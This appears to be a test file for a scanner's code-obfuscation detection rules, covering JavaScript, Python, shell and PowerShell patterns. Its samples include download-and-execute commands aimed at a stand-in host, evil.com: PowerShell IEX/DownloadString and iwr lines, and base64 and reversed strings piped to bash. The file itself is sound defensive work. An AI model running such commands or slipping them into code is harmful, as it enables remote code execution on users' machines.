import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { rules } from '../../dist/rules/obfuscation.js';

describe('Code Obfuscation Detection Rules', () => {
  it('should have 22 obfuscation rules', () => {
    assert.equal(rules.length, 21);
  });

  // ============================================
  // JavaScript Obfuscation
  // ============================================
  describe('obfusc-js-eval-encoded', () => {
    const rule = rules.find(r => r.id === 'obfusc-js-eval-encoded');

    it('detects eval(atob(...))', () => {
      rule.pattern.lastIndex = 0;
      assert.match('eval(atob("SGVsbG8="))', rule.pattern);
    });

    it('detects eval(Buffer.from(...))', () => {
      rule.pattern.lastIndex = 0;
      assert.match('eval(Buffer.from("aGVsbG8=", "base64"))', rule.pattern);
    });

    it('detects eval(decodeURIComponent(...))', () => {
      rule.pattern.lastIndex = 0;
      assert.match('eval(decodeURIComponent("%48%65%6C%6C%6F"))', rule.pattern);
    });
  });

  describe('obfusc-js-fromcharcode-long', () => {
    const rule = rules.find(r => r.id === 'obfusc-js-fromcharcode-long');

    it('detects long fromCharCode sequences', () => {
      rule.pattern.lastIndex = 0;
      assert.match('String.fromCharCode(104, 101, 108, 108, 111, 32)', rule.pattern);
    });
  });

  // ============================================
  // Base64 Obfuscation
  // ============================================
  describe('obfusc-base64-exec', () => {
    const rule = rules.find(r => r.id === 'obfusc-base64-exec');

    it('detects atob + eval', () => {
      rule.pattern.lastIndex = 0;
      assert.match('var code = atob(payload); eval(code)', rule.pattern);
    });

    it('detects base64_decode + exec', () => {
      rule.pattern.lastIndex = 0;
      assert.match('base64_decode($encoded) . exec()', rule.pattern);
    });
  });

  describe('obfusc-base64-long-inline', () => {
    const rule = rules.find(r => r.id === 'obfusc-base64-long-inline');

    it('detects long Base64 strings', () => {
      rule.pattern.lastIndex = 0;
      const longB64 = '"' + 'A'.repeat(120) + '"';
      assert.match(longB64, rule.pattern);
    });
  });

  // ============================================
  // Python Obfuscation
  // ============================================
  describe('obfusc-python-exec-compile', () => {
    const rule = rules.find(r => r.id === 'obfusc-python-exec-compile');

    it('detects exec(compile(...))', () => {
      rule.pattern.lastIndex = 0;
      assert.match('exec(compile(code, "<string>", "exec"))', rule.pattern);
    });

    it('detects exec(base64.b64decode(...))', () => {
      rule.pattern.lastIndex = 0;
      assert.match('exec(base64.b64decode("cHJpbnQoMSk="))', rule.pattern);
    });
  });

  describe('obfusc-python-rot13', () => {
    const rule = rules.find(r => r.id === 'obfusc-python-rot13');

    it('detects ROT13 decode', () => {
      rule.pattern.lastIndex = 0;
      assert.match('codecs.decode("uryyb", "rot_13")', rule.pattern);
    });
  });

  describe('obfusc-python-lambda-chain', () => {
    const rule = rules.find(r => r.id === 'obfusc-python-lambda-chain');

    it('detects nested lambda chain', () => {
      rule.pattern.lastIndex = 0;
      assert.match('lambda x: lambda y: lambda z: x+y+z', rule.pattern);
    });
  });

  // ============================================
  // Shell Obfuscation
  // ============================================
  describe('obfusc-shell-base64-pipe', () => {
    const rule = rules.find(r => r.id === 'obfusc-shell-base64-pipe');

    it('detects base64 piped to bash', () => {
      rule.pattern.lastIndex = 0;
      assert.match('echo "Y3VybCBodHRwOi8vZXZpbC5jb20==" | base64 -d | bash', rule.pattern);
    });
  });

  describe('obfusc-shell-rev-command', () => {
    const rule = rules.find(r => r.id === 'obfusc-shell-rev-command');

    it('detects reversed string piped to bash', () => {
      rule.pattern.lastIndex = 0;
      assert.match('echo "hsab/nib/ lruc" | rev | bash', rule.pattern);
    });
  });

  describe('obfusc-shell-hex-echo', () => {
    const rule = rules.find(r => r.id === 'obfusc-shell-hex-echo');

    it('detects hex echo piped to shell', () => {
      rule.pattern.lastIndex = 0;
      assert.match('echo -e "\\x63\\x75\\x72\\x6c\\x20" | bash', rule.pattern);
    });
  });

  // ============================================
  // PowerShell Obfuscation
  // ============================================
  describe('obfusc-powershell-encodedcommand', () => {
    const rule = rules.find(r => r.id === 'obfusc-powershell-encodedcommand');

    it('detects -EncodedCommand', () => {
      rule.pattern.lastIndex = 0;
      assert.match('powershell -EncodedCommand JABjAGwAaQBlAG4AdAA=', rule.pattern);
    });

    it('detects abbreviated -enc', () => {
      rule.pattern.lastIndex = 0;
      assert.match('powershell -enc JABjAGwAaQBlAG4AdAA=', rule.pattern);
    });
  });

  describe('obfusc-powershell-iex', () => {
    const rule = rules.find(r => r.id === 'obfusc-powershell-iex');

    it('detects IEX with WebClient', () => {
      rule.pattern.lastIndex = 0;
      assert.match('IEX((New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1"))', rule.pattern);
    });

    it('detects Invoke-Expression with iwr', () => {
      rule.pattern.lastIndex = 0;
      assert.match('Invoke-Expression (iwr http://evil.com/script.ps1)', rule.pattern);
    });
  });

  // ============================================
  // General
  // ============================================
  describe('obfusc-unicode-escape-abuse', () => {
    const rule = rules.find(r => r.id === 'obfusc-unicode-escape-abuse');

    it('detects excessive unicode escapes', () => {
      rule.pattern.lastIndex = 0;
      assert.match('var \\u0065\\u0076\\u0061\\u006C = 1', rule.pattern);
    });
  });

  describe('obfusc-known-tool-signature', () => {
    const rule = rules.find(r => r.id === 'obfusc-known-tool-signature');

    it('detects javascript-obfuscator', () => {
      rule.pattern.lastIndex = 0;
      assert.match('// javascript-obfuscator output', rule.pattern);
    });

    it('detects _0x hex variable pattern', () => {
      rule.pattern.lastIndex = 0;
      assert.match('var _0x4a2b = ["\\x48\\x65"]', rule.pattern);
    });
  });
});
